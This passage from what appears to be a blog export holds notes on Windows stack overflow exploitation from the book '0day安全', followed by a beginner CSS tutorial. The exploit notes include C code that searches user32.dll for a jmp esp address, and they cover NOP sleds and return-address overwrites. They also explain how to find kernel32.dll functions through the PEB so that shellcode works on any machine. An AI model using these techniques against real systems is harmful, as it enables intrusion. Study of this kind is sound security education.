done_flag=FALSE;</span><br><span class="line">    handle=LoadLibrary(DLL_NAME); </span><br><span class="line">    <span class="keyword">if</span>(!handle) </span><br><span class="line">    &#123; </span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;load dll error!&quot;</span>); </span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    ptr=(BYTE*)handle;</span><br><span class="line">    <span class="keyword">for</span>(position=<span class="number">0</span>;!done_flag;position++) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">try</span> </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span>(ptr[position]==<span class="number">0xFF</span>&amp;&amp;ptr[position+<span class="number">1</span>]==<span class="number">0xE4</span>)<span class="comment">//jmp esp对应的机器码为0xFFE4 </span></span><br><span class="line">            &#123; </span><br><span class="line">              <span class="keyword">int</span> address=(<span class="keyword">int</span>)ptr+position; </span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%x\n&quot;</span>,address); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">catch</span>(...) </span><br><span class="line">        &#123; </span><br><span class="line">           <span class="keyword">int</span> address=(<span class="keyword">int</span>)ptr+position; </span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">&quot;END OF 0x%x\n&quot;</span>,address); </span><br><span class="line">           done_flag=<span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">     &#125; </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>jmp esp</code>对应的机器码是<code>0xFFE4</code>，上述程序的作用就是从<code>user32.dll</code>在内存中的基地址开始向后搜索<code>0xFFE4</code>，如果找到就返回其内存地址（指针值）。同理如果想使用别的动态链接库中的地址（如“kernel32.dI”、“mfc42.dIl” 等），或者使用其他类型的跳转地址（如call esp，jmp ebp等)，也可以通过对上述程序稍加修改而轻易获得。</p>
<h3 id="3-3-缓冲区的组织"><a href="#3-3-缓冲区的组织" class="headerlink" title="3.3 缓冲区的组织"></a>3.3 缓冲区的组织</h3><h4 id="3-3-1-缓冲区的组成"><a href="#3-3-1-缓冲区的组成" class="headerlink" title="3.3.1 缓冲区的组成"></a>3.3.1 缓冲区的组成</h4><div class="note info"><p>送入缓冲区的数据可以分为以下几种：</p>
<ol>
<li>填充物：可以是任何值，但是一般用<code>NOP</code>指令对应的<code>0x90</code>来填充缓冲区，并把 shellcode 布置于其后（<code>NOP</code>的高地址）。这样即使不能准确地跳转到 shellcode 的开始，只要能跳进填充区，处理器最终也能顺序执行到 shellcode。</li>
<li>淹没返回地址的数据：可以是跳转指令的地址、shellcode 起始地址，甚至是一个近似 shellcode 的地址（通过<code>nop</code>滑入）。</li>
<li>shellcode：可执行的机器代码。</li>
</ol>
</div>

<p>在缓冲区中如何布置 shellcode 对 exploit 的成功至关重要，当 shellcode 较缓冲区小很多时，可直接将其置于返回地址之前（地址较返回地址小），当 shellcode 较大时，将其置于返回地址之后（地址较返回地址大），然后可以使用 <code>jmp esp</code>等指令来定位 shellcode。但是需要注意的问题就是这样的 shellcode 布置于前一个栈帧中，当 shellcode 较大时，这样就会大范围地破坏前栈帧数据可能引发一些其他问题。</p>
<h4 id="3-3-2-抬高栈顶保护shellcode"><a href="#3-3-2-抬高栈顶保护shellcode" class="headerlink" title="3.3.2 抬高栈顶保护shellcode"></a>3.3.2 抬高栈顶保护shellcode</h4><p>将shellcode布置在缓冲区中虽然有不少好处，但是也会产生问题。函数返回时，当前栈帧被弹出，这时缓冲区位于栈顶ESP之上的内存区域。在弹出栈帧时只是改变了ESP寄存器中的值，<mark class="label warning">逻辑上，ESP以上的内存空间的数据已经作废；</mark><mark class="label success">物理上，这些数据并没有被销毁</mark>。</p>
<p>当前栈逻辑上销毁后，栈帧返回到调用函数，如果shellode被再次调用时，若shellcode中没有压栈指令向栈中写入数据还没有太大影响；但如果使用<code>push</code>指令在栈中暂存数据，压栈数据很可能会破坏到shellcode本身，压栈的数据会增高当前栈帧的高度，然后覆盖逻辑上已被销毁的栈帧中的shellcode。这里假设调用函数的栈帧是紧挨着被调函数的，位于被调函数的高地址，这个过程如图3.3.2所示。</p>
<p>当缓冲区相对shellcode较大时，把shellcode布置在缓冲区的“前端”（内存低址方向）， 这时shellcode离调用函数栈顶较远，几次压栈可能只会破坏到一些填充值<code>nop</code>；但是，如果缓冲区已经被shellcode占满，则shellcode离调用函数栈顶比较近，这时的情况就比较危险了。</p>
<p>为了使shellcode具有较强的通用性，我们通常会在shellode开始就大范围抬高被调函数栈顶，如下第三图<code>jmp esp-X</code>后定位一条指令<code>sub esp,N</code>，这里的N足够大以覆盖被调函数的栈，将逻辑上已经销毁的被调函数的栈变成当前函数的栈，把shellcode“藏”在栈内保护起来，从而达到保护自身安全的目的。这个过程如图3.3.3所示。</p>
<p>【<a href="https://brant-ruan.github.io/0day/2018/06/14/0day3.html">0day安全 | Chapter 3 开发shellcode的艺术</a>】</p>
<p><img data-src="https://i.loli.net/2021/02/19/hobeUvdJOFRAWk5.png" alt="31.png"></p>
<p><img data-src="https://i.loli.net/2021/02/19/IAgrduTezbBCEnL.png" alt="32.png"></p>
<p><img data-src="https://i.loli.net/2021/02/19/JnLQfONMEHDe46P.png" alt="34"></p>
<p><img data-src="https://i.loli.net/2021/02/19/GX9CjfvD7mUJLRO.png" alt="33.png"></p>
<p><img data-src="https://i.loli.net/2021/02/20/qCpf1FO3wdMnIJW.png" alt="35.png"></p>
<h4 id="3-3-3-使用NOP雪橇"><a href="#3-3-3-使用NOP雪橇" class="headerlink" title="3.3.3 使用NOP雪橇"></a>3.3.3 使用NOP雪橇</h4><p>个别有苛刻的限制条件的漏洞不允许我们使用跳转指令精确定位shellcode，而使用 shellcode的静态地址来覆盖又不够准确，这时我们可以做一个折中：如果能够淹没大片的内存区域，可以将shellcode 布置在一大段<code>nop</code>之后。这时定位shellcode时，只要能跳进这一大片<code>nop</code>中，shellcode就可以最终得到执行，如图3.3.4所示。</p>
<div class="note danger"><p><code>NOP</code>指令除了对程序计数器加一，使之指向下一条指令之外，没有其他任何效果。这种将跳转定位在一片<code>nop</code>指令之中一直执行到shellcode（<code>nop</code>比shellcode更靠近栈顶），就好像是在滑行，所以也称之为“空操作雪橇”（nop sled）。浏览器的漏洞利用采用Heap Spray也是相同思想。</p>
</div>

<h4 id="3-3-4-函数返回地址移位"><a href="#3-3-4-函数返回地址移位" class="headerlink" title="3.3.4 函数返回地址移位"></a>3.3.4 函数返回地址移位</h4><ol>
<li>使用大片返回地址来覆盖真正的返回地址。</li>
<li>地址覆盖时可能会发生字节错位，可以使用堆中的地址来放置shellcode，进行绕过。</li>
</ol>
<p>如果函数返回地址的偏移按双字（DWORD）不定，可以用一片连续的跳转指令的地址来覆盖函数返回地址，只要其中有一个能够成功覆盖，shellcode就可以得到执行。这个过程如图3.3.5所示。</p>
<p>在覆盖返回地址时可能会发生字节错位的情况如<code>strcat</code>产生的漏洞：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcat</span>(程序安装目录, 输入的字符串);</span><br></pre></td></tr></table></figure>

<p>在不同主机上程序安装目录可能不同，如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">C:\xxx\</span><br><span class="line">C:\xxxy\</span><br><span class="line">C:\xxxyz\</span><br><span class="line">C:\xxxyza\</span><br></pre></td></tr></table></figure>

<p>假如把返回地址覆盖为<code>0x77DC965B</code>，则理论上只有25%的成功率。上面提到的使用一片连续的跳转指令地址的方法不起作用，因为<strong>多出的字节只要不是地址长度的倍数，就一定会引起地址的错位</strong>：</p>
<p><img data-src="https://i.loli.net/2021/02/20/fxUhpEFi6NCQPzg.png" alt="36.png"></p>
<p>解决办法是：使用堆的地址来解决，使用<code>0x0a0a0a0a</code>、<code>0x0c0c0c0c</code>之类的返回地址。当然这种情况下，shellcode位于堆上。</p>
<p><img data-src="https://i.loli.net/2021/02/20/Hi5PsxO7XDz6GEM.png" alt="37.png"></p>
<h3 id="3-4-开发通用的shellcode"><a href="#3-4-开发通用的shellcode" class="headerlink" title="3.4 开发通用的shellcode"></a>3.4 开发通用的shellcode</h3><h4 id="3-4-1-定位API的原理"><a href="#3-4-1-定位API的原理" class="headerlink" title="3.4.1 定位API的原理"></a>3.4.1 定位API的原理</h4><p>前面解决了shellcode地址不定的问题，本节解决不同操作系统版本、不同补丁环境下动态链接库中导出函数地址不定的问题。方法很简单：在shellcode中对函数先定位，再调用。</p>
<p>影响动态链接库中的导出函数的主要因素有：</p>
<ol>
<li><strong>不同的操作系统版本</strong>。</li>
<li><strong>不同的补丁版本</strong>：很多安全补丁会修改这些动态链接库中的函数，使得不同版本补丁对应的动态链接库的内容有所不同，包括动态链接库文件的大小和导出函数的偏移地址。由于这些因素，我们手工查出的API地址很可能会在其他计算机上失效。</li>
</ol>
<p>在shellcode中使用静态函数地址来调用API会使exploit的通用性受到很大限制。所以，实际中使用的shellcode必须还要能动态地获得自身所需的API函数地址。</p>
<div class="note default"><p>Windows的API是通过动态链接库中的导出函数来实现的，例如：</p>
<ul>
<li>内存操作等的数在<code>kernel32.dll</code>中实现</li>
<li>大量的图形界面相关的API则在<code>user32.dll</code>中实现。</li>
</ul>
</div>

<p>Win_32平台下的shellcode使用最广泛的方法，就就是从进程环境块（PEB）中找到动态链接库的导出表，并搜索出所需的API地址，然后调用。</p>
<mark class="label danger">所有Win_32程序都会加载 ntdll.dll 和 kernel32.dll 这两个最基础的动态链接库。</mark>

<p>如果想要在Win_32平台下定位kernel.dll中的API地址，可以采用如下方法：</p>
<ol>
<li>首先通过段选择字FS在内存中找到当前的线程环境块TEB。</li>
<li>线程环境块偏移位置为<code>0x30</code>的地方存放着指向进程环境块PEB的指针。</li>
<li>进程环境块中偏移位置为<code>0x0C</code>的地方存放着指向<code>PEB_LDR_DATA </code>结构体的指针，其中，存放着已经被进程装载的动态链接库的信息。</li>
<li><code> PEB_LDR_DATA</code>结构体偏移位置为<code>0x1C</code>的地方存放着指向模块初始化链表的头指针<code>InInitializationOrderModuleList</code>。</li>
<li>块初始化链表<code>InInitializationOrderModuleList</code>中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点就是kernel32.dll。</li>
<li>找到属于kernel32.dll的结点后，在其基础上再偏移<code>0x08</code>就是kenel32.dlI在内存中的加载基地址。</li>
<li>从kernel32.dll的加载基址算起，偏移<code>0x3C</code>的地方就是其PE头。</li>
<li>PE头偏移<code>0x78</code>的地方存放着指向函数导出表的指针。</li>
<li>至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址，如图3.4.1<ul>
<li>导出表偏移<code>0x1C</code>处的指针指向存储导出函数偏移地址(RVA)的列表。</li>
<li>导出表偏移<code>0x20</code>处的指针指向存储导出函数函数名的列表。</li>
<li>函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的RVA。</li>
<li>获得RVA后，再加上前边已经得到的动态链接库的加载基址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是我们最终在shellcode中调用时需要的地址。</li>
</ul>
</li>
</ol>
<p>按照上面的方法，我们已经可以获得kernel32.dll中的任意函数。类似地，我们已经具备了定位ws2_32.dlI中的winsock函数来编写一个能够获得远程shell的真正的shellcode了。</p>
<div class="note warning"><p><code>kernel32.dll</code>中有两个导出函数：<code>LoadLibrary</code>和<code>GetProcAddress</code>，可以通过这两个函数帮助定位其他API。由于<code>MessageBox</code>位于<code>user32.dll</code>库中，后面我们将借助<code>LoadLibrary</code>为shellcode加载<code>user32.dll</code>，从而调用<code>MessageBox</code>。</p>
</div>

<p><img data-src="https://i.loli.net/2021/02/20/v9Ntf3lkWC1cAHB.png" alt="38.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS 基础</title>
    <url>/post/HTML-CSS/</url>
    <content><![CDATA[<p>hhh… ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<span id="more"></span>

<br />

<br />

<center><font color="#00B2EE" face="Comic sans MS" size=5>CSS 基础</font> </center>


<br />

<br />





<h3 id="一-CSS-初识"><a href="#一-CSS-初识" class="headerlink" title="一. CSS 初识"></a><font color="#FF6347" face="Comic sans MS">一. CSS 初识</font></h3><br />


<p><font face="Microsoft YaHei"><strong>CSS是给HTML标记加的样式；JS是给HTML标记加的行为。HTML标记是最先出现的。</strong></font></p>
<blockquote>
<ol>
<li>CSS是什么?</li>
<li>为什么要使用CSS?</li>
<li>CSS和HTML是什么关系？</li>
<li>CSS应该怎样使用？</li>
</ol>
</blockquote>
<br />


<p><font color="#00B2EE"><strong>1. CSS是什么?</strong></font></p>
<ol>
<li><p>CSS（Cascading Stylesheets，层叠样式表）。</p>
</li>
<li><p><strong>CSS的主要目的：是</strong><font color="#FF7F00"><strong>给HTML标记添加各种各样的表现(格式、样式)</strong></font>。比如：文字样式、背景、文本样式、链接样式。</p>
</li>
<li><p>是一种制作网页的新技术，现在已经为大多数的浏览器所支持，成为网页设计必不可少的工具之一。使用CSS能够简化网页的格式代码，加快下载显示的速度，也减少了需要上传的代码数量，大大减少了重复劳动的工作量。尤其是当你面对的是有数百个网页的站点时，CSS简直象是神对我们的恩赐！</p>
</li>
</ol>
<br />

<p><font color="#00B2EE"><strong>2. 为什么要使用CSS?</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>HTML</strong>超文本标注语言</font>：各种HTML标记。<br><font color="#FF7F00"><strong>CSS</strong>层叠样式表</font>：给HTML标记加的样式。<br><font color="#FF7F00"><strong>JavaScript</strong>脚本程序</font>：给HTML标记加的程序。</p>
</blockquote>
<p>   W3C（The World Wide Web Consortium）把动态HTML（Dynamic HTML）分为三个部分来实现：脚本语言（包括javascript、Vbscript等）、支持动态效果的浏览器（包括Internet Explorer、Netscape Navigator等）和CSS样式表。</p>
<br />

<p><font color="#00B2EE"><strong>3. CSS和HTML是什么关系？</strong></font></p>
<p><strong>CSS的主要目的：是</strong><font color="#FF7F00"><strong>给HTML标记添加各种各样的表现(格式、样式)</strong></font>。比如：文字样式、背景、文本样式、链接样式。</p>
<br />

<p><font color="#00B2EE"><strong>4. CSS应该怎样使用？</strong></font></p>
<blockquote>
<ol>
<li>在HTML标签中直接使用。</li>
<li>在HTML标签先定义属性id或者class，然后在**<code>&lt;head&gt;&lt;/head&gt;</code>**定义一个样式表来表现这个属性id或者class。</li>
</ol>
</blockquote>
<p>CSS注释以 <strong><code>/*</code></strong> 开始, 以 <strong><code>*/</code></strong>  结束, 实例如下:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*这是个注释*/</span></span><br><span class="line"><span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="attribute">text-align</span>:center;</span><br><span class="line"><span class="comment">/*这是另一个注释*/</span></span><br><span class="line"><span class="attribute">color</span>:black;</span><br><span class="line"><span class="attribute">font-family</span>:arial;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br />

<br />



<h3 id="二-CSS-框架"><a href="#二-CSS-框架" class="headerlink" title="二. CSS 框架"></a><font color="#FF6347" face="Comic sans MS">二. CSS 框架</font></h3><p>CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明</p>
<p><img data-src="https://i.loli.net/2019/03/10/5c84f57ee276a.png" alt="1.png"></p>
<br />

<p><font color="#FF7F00"><strong>选择器：</strong></font>就是选择HTML标记，换句话说：就是给哪个HTML标记加样式。<br><font color="#FF7F00"><strong>格式声明语句：</strong></font>由**<code>&#123; &#125;</code><strong>构成，</strong><code>&#123; &#125;</code><strong>中每条声明由</strong><code>属性名:属性值;</code>**构成。</p>
<p><font color="#FF7F00"></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li>每个属性有一个值，属性和值被冒号**<code>:</code><strong>分开。属性和属性之间用英文分号</strong><code>；</code><strong>隔开。最后以分号</strong><code>；</code>**结束。</li>
<li>属性值，一个属性名可以取不同的值，这个值不加引号。</li>
<li>CSS中的数字单位都是**<code>px</code><strong>，这个</strong><code>px</code>**不能省略。</li>
</ol>
<br />

<h4 id="2-1-CSS-样式"><a href="#2-1-CSS-样式" class="headerlink" title="2.1 CSS 样式"></a><font color="#3CB371" face="Comic sans MS">2.1 CSS 样式</font></h4><p>要想在浏览器中显示出预期的CSS样式表效果，就要让浏览器识别并正确调用CSS。当浏览器读取样式表时，要依照文本格式来读，这里介绍四种在页面中插入CSS样式表的方法：<strong>链入外部样式表、内部样式表、导入外部样式表和内联样式</strong>。</p>
<br />

<h5 id="1-链入外部样式表"><a href="#1-链入外部样式表" class="headerlink" title="1. 链入外部样式表"></a><font color="#00B2EE" face="Microsoft YaHei">1. 链入外部样式表</font></h5><p><strong>链入外部样式表：</strong>是把样式表（选择器+声明）保存为一个样式表**<code>.css</code><strong>文件，然后在页面中用</strong><code>&lt;link&gt;</code><strong>标记来链接到这个样式表文件，这个</strong><code>&lt;link&gt;</code><strong>标记必须放到页面的</strong><code>&lt;head&gt;...&lt;/head&gt;</code>**区内。</p>
<p>如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt; </span><br><span class="line"></span><br><span class="line">…… </span><br><span class="line">&lt;link href=<span class="string">&quot;mystyle.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> media=<span class="string">&quot;all&quot;</span>&gt; </span><br><span class="line">…… </span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<br />

<blockquote>
<p>上面这个例子表示浏览器从mystyle.css文件中以文档格式读出定义的样式表。<br>**<code>href=&quot;mystyle.css&quot;</code>**是文件所在的位置。<br>**<code>rel=&quot;stylesheet&quot;</code>**是指在页面中使用这个外部的样式表。rel 属性规定当前文档与被链接文档之间的关系。<br>**<code>type=&quot;text/css&quot;</code>**是指文件的类型是样式表文本。<br>**<code>media</code>**是选择媒体类型，这些媒体包括：屏幕，纸张，语音合成设备，盲文阅读设备等。</p>
</blockquote>
<p>　　<font color="#FF7F00"><strong>一个外部样式表文件可以应用于多个页面</strong></font>。当你改变这个样式表文件时，所有页面的样式都随之而改变。在制作大量相同样式页面的网站时，非常有用，不仅减少了重复的工作量，而且有利于以后的修改、编辑，浏览时也减少了重复下载代码。</p>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font><br>样式表文件可以用任何文本编辑器（例如：记事本）打开并编辑，一般样式表文件扩展名为.css。内容是定义的样式表，不包含HTML标记，mystyle.css这个文件的内容如下：</p>
</blockquote>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hr &#123;<span class="attribute">color</span>: sienna&#125; </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>: <span class="number">20px</span>&#125; </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>)&#125; </span><br><span class="line"><span class="comment">/*定义水平线的颜色为土黄；段落左边的空白边距为20象素；页面的背景图片为images目录下的back40.gif文件*/</span></span><br></pre></td></tr></table></figure>

<br />

<h5 id="2-内部样式表"><a href="#2-内部样式表" class="headerlink" title="2. 内部样式表"></a><font color="#00B2EE" face="Microsoft YaHei">2. 内部样式表</font></h5><p><strong>内部样式表：</strong>是把样式表放到页面的**<code>&lt;head&gt;...&lt;/head&gt;</code><strong>区里，这些定义的样式就应用到页面中了，样式表是用</strong><code>&lt;style&gt;&lt;/style&gt;</code>**标记插入的。</p>
<p>从下例中可以看出&lt;style&gt;&lt;&#x2F;style&gt;标记的用法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;head&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt; </span><br><span class="line">hr &#123;<span class="attribute">color</span>: sienna&#125; </span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>: <span class="number">20px</span>&#125; </span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>)&#125; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<br />

<h5 id="3-导入外部样式表"><a href="#3-导入外部样式表" class="headerlink" title="3. 导入外部样式表 "></a><font color="#00B2EE" face="Microsoft YaHei">3. 导入外部样式表 </font></h5><p><strong>导入外部样式表：</strong>是指<font color="#FF7F00"><strong>在内部样式表的<code>&lt;style&gt;&lt;/style&gt;</code>里导入一个外部样式表</strong></font>，导入时用**<code>@import</code>**。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt; </span><br><span class="line">&lt;!-- </span><br><span class="line">@import <span class="string">&quot;mystyle.css&quot;</span> </span><br><span class="line">其他样式表的声明 </span><br><span class="line">--&gt; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<br />

<p>例中**<code>@import &quot;mystyle.css&quot;</code>**表示导入mystyle.css样式表，注意使用时外部样式表的路径。方法和链入样式表的方法很相似，但导入外部样式表输入方式更有优势。实质上<font color="#FF7F00"><strong>它相当于存在内部样式表中的</strong></font>。 </p>
<p><font color="#FF7F00"><strong>注意：</strong></font>导入外部样式表必须在样式表的开始部分，在其他内部样式表上面。</p>
<p><font color="#FF7F00"></font></p>
<br />

<h5 id="4-内联样式"><a href="#4-内联样式" class="headerlink" title="4. 内联样式"></a><font color="#00B2EE" face="Microsoft YaHei">4. 内联样式</font></h5><p><strong>内联样式：</strong>是混合在HTML标记里使用的，用这种方法，可以很简单的对某个元素单独定义样式。内联样式的使用是<font color="#FF7F00"><strong>直接将在HTML标记里加入style参数</strong></font>。而style参数的内容就是CSS的属性和值</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;p style=<span class="string">&quot;color: sienna;margin-left: 20px;&quot;</span>&gt; </span><br><span class="line"></span><br><span class="line">这是一个段落 </span><br><span class="line"></span><br><span class="line">&lt;/p&gt; </span><br><span class="line">&lt;!--这个段落颜色为土黄，左边距为<span class="number">20</span>象素--&gt;</span><br></pre></td></tr></table></figure>

<br />

<p>在style参数后面的引号里的内容相当于在样式表大括号里的内容。 </p>
<p><font color="#FF7F00"><strong>注意：</strong></font><strong>style参数可以应用于任意BODY内的元素（包括BODY本身）</strong>，除了BASEFONT、PARAM和SCRIPT。</p>
<p><font color="#FF7F00"></font></p>
<br />

<h5 id="5-多重样式表叠加的优先级"><a href="#5-多重样式表叠加的优先级" class="headerlink" title="5. 多重样式表叠加的优先级"></a><font color="#00B2EE" face="Microsoft YaHei">5. 多重样式表叠加的优先级</font></h5><p>CSS样式表有层叠顺序，这里我们讨论插入样式表的这几种方法的叠加，如果在同一个选择器上使用几个不同的样式表时，这个属性值将会叠加几个样式表，<font color="#FF7F00"><strong>遇到冲突的地方会以最后定义的为准</strong></font>。例如，我们首先<strong>链入</strong><code>&lt;link&gt;</code><strong>一个外部样式表</strong>，其中定义了**<code>h3</code><strong>选择符的</strong><code>color</code><strong>、</strong><code>text-alig</code><strong>和</strong><code>font-size</code>**属性：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h3</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="attribute">color</span>: red; </span><br><span class="line"><span class="attribute">text-align</span>: left; </span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">8pt</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*标题3的文字颜色为红色；向左对齐；文字尺寸为8号字*/</span></span><br></pre></td></tr></table></figure>

<p>然后在<strong>内部样式表</strong>里也定义了h3选择符的text-align和font-size属性：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h3</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="attribute">text-align</span>: right; </span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">20pt</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*标题3文字向右对齐；尺寸为20号字*/</span></span><br></pre></td></tr></table></figure>

<p>那么这个页面叠加后的样式就是：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">color</span>: red; </span><br><span class="line"></span><br><span class="line"><span class="attribute">text-align</span>: right; </span><br><span class="line"></span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">20pt</span>; </span><br><span class="line"><span class="comment">/*文字颜色为红色；向右对齐；尺寸为20号字*/</span></span><br></pre></td></tr></table></figure>

<p>字体颜色从外部样式表里保留下来，而对齐方式和字体尺寸都有定义时，按照后定义的优先而依照内部样式表。</p>
<br />

<p><font face="Microsoft YaHei"><strong>w3school给出的优先级顺序从低到高是：</strong></font><br>浏览器缺省设置<br>外部样式表<br>内部样式表（位于 &lt;head&gt; 标签内部）<br>内联样式（在 HTML 元素内部）</p>
<p>因此，内联样式（在 HTML 元素内部）拥有最高的优先权，这意味着它将优先于以下的样式声明： 标签中的样式声明，外部样式表中的样式声明，或者浏览器中的样式声明（缺省值）。<br>可参考：<font color="#00B2EE">《<a href="https://segmentfault.com/a/1190000005005091">css的样式优先级</a>》</font> </p>
<br />

<h4 id="2-2-CSS-选择器"><a href="#2-2-CSS-选择器" class="headerlink" title="2.2 CSS 选择器"></a><font color="#3CB371" face="Comic sans MS">2.2 CSS 选择器</font></h4><p>在 CSS 中，选择器是一种模式，用于选择需要添加样式的元素。<br>属性选择器可以根据元素的属性及属性值来选择元素。</p>
<p><strong>三种基本的选择器类型：</strong>标签名选择器、类选择器、ID选择器</p>
<p><font color="#FF7F00"><strong>注意：</strong></font>在标签内写入style&#x3D;” “的方式，应该是CSS的一种引入方式，而不是选择器，因为根本就没有用到选择器。 </p>
<p><font color="#FF7F00"></font></p>
<h5 id="1-基本选择器"><a href="#1-基本选择器" class="headerlink" title="1. 基本选择器"></a><font color="#00B2EE" face="Microsoft YaHei">1. 基本选择器</font></h5><p><font face="Microsoft YaHei"><strong>（1）标签名选择器</strong></font></p>
<p>一个HTML文档中有许多标签，例如p标签，h1标签等。若要使文档中的所有p标签都使用同一个CSS样式，就应使用标签选择器。 </p>
<p><font color="#FF7F00"><strong>注意：</strong></font>CSS标签选择器，与HTML标签的名称一样，但不能加尖括号。</p>
<p>示例：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">       <span class="selector-tag">h1</span>&#123;</span><br><span class="line">         <span class="attribute">color</span>:red;</span><br><span class="line">         &#125;</span><br><span class="line">       <span class="selector-tag">p</span>&#123;</span><br><span class="line">         <span class="attribute">color</span>:blue;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>


<br />

<p><font face="Microsoft YaHei"><strong>（2）类选择器</strong></font></p>
<ul>
<li><p>使用标签选择器可以为整个HTML文档中的同一个标签指定相同的CSS样式。但是在实际运用中，HTML文档中的同一个标签会被反复使用。若要为相同的标签赋予不同的CSS样式就应使用类选择器。 </p>
</li>
<li><p><font color="#FF7F00"><strong>描述：</strong></font>给一类HTML标签加样式。这里所指的“一类”是：每个HTML标签都有一个class属性，且class的值一样。class属性是公共属性，每个HTML标签都有。</p>
</li>
<li><p>类选择器的名称，必须以**<code>.</code><strong>开头，后限HTML标签的class属性的值。如：</strong><code>.box&#123; color:red; &#125;</code>**</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">           &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">           &lt;title&gt;测试一下&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">           &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">                .NO1&#123;</span><br><span class="line">                      color:red;</span><br><span class="line">                      background-color:<span class="comment">#88ff66;</span></span><br><span class="line">                    &#125;      <span class="comment">//无;或,号</span></span><br><span class="line">               .test&#123;</span><br><span class="line">     	              color:red;</span><br><span class="line">     	              border:<span class="number">1</span>px blue solid;</span><br><span class="line">     	            &#125; </span><br><span class="line">          &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1 class=&quot;NO1&quot;&gt;习近平心中的互联网&lt;/h1&gt;</span><br><span class="line">        &lt;div class=&quot;test&quot;&gt;测试代码&lt;/div&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br />

<blockquote>
